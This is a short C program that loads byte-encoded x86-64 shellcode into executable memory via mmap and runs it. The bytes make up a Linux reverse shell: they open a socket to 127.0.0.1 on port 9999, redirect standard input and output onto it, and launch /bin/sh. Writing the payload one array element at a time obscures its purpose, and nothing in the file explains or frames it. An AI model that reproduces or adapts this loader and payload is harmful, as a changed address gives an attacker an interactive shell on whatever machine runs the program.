#include <sys/mman.h>
#include <string.h>
char buf[74] = ""; 


int main(void)
{


buf[0] = (char)0x6a; buf[1] = (char)0x29; buf[2] = (char)0x58; buf[3] = (char)0x99; buf[4] = (char)0x6a; buf[5] = (char)0x02; buf[6] = (char)0x5f; buf[7] = (char)0x6a; buf[8] = (char)0x01; buf[9] = (char)0x5e; buf[10] = (char)0x0f; buf[11] = (char)0x05; buf[12] = (char)0x48; buf[13] = (char)0x97; buf[14] = (char)0x48; buf[15] = (char)0xb9; buf[16] = (char)0x02; buf[17] = (char)0x00; buf[18] = (char)0x27; buf[19] = (char)0x0f; buf[20] = (char)0x7f; buf[21] = (char)0x00; buf[22] = (char)0x00; buf[23] = (char)0x01; buf[24] = (char)0x51; buf[25] = (char)0x48; buf[26] = (char)0x89; buf[27] = (char)0xe6; buf[28] = (char)0x6a; buf[29] = (char)0x10; buf[30] = (char)0x5a; buf[31] = (char)0x6a; buf[32] = (char)0x2a; buf[33] = (char)0x58; buf[34] = (char)0x0f; buf[35] = (char)0x05; buf[36] = (char)0x6a; buf[37] = (char)0x03; buf[38] = (char)0x5e; buf[39] = (char)0x48; buf[40] = (char)0xff; buf[41] = (char)0xce; buf[42] = (char)0x6a; buf[43] = (char)0x21; buf[44] = (char)0x58; buf[45] = (char)0x0f; buf[46] = (char)0x05; buf[47] = (char)0x75; buf[48] = (char)0xf6; buf[49] = (char)0x6a; buf[50] = (char)0x3b; buf[51] = (char)0x58; buf[52] = (char)0x99; buf[53] = (char)0x48; buf[54] = (char)0xbb; buf[55] = (char)0x2f; buf[56] = (char)0x62; buf[57] = (char)0x69; buf[58] = (char)0x6e; buf[59] = (char)0x2f; buf[60] = (char)0x73; buf[61] = (char)0x68; buf[62] = (char)0x00; buf[63] = (char)0x53; buf[64] = (char)0x48; buf[65] = (char)0x89; buf[66] = (char)0xe7; buf[67] = (char)0x52; buf[68] = (char)0x57; buf[69] = (char)0x48; buf[70] = (char)0x89; buf[71] = (char)0xe6; buf[72] = (char)0x0f; buf[73] = (char)0x05;
    void (*func)();
    void *exec_mem = mmap(0, sizeof(buf), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);

    // Copy buf to the executable memory
    memcpy(exec_mem, buf, sizeof(buf));

    // Assign the buf to the function pointer
    func = (void (*)())exec_mem;

    // Execute the buf
    func();

    // ...

    // Clean up
    munmap(exec_mem, sizeof(buf));

    return 0;
}
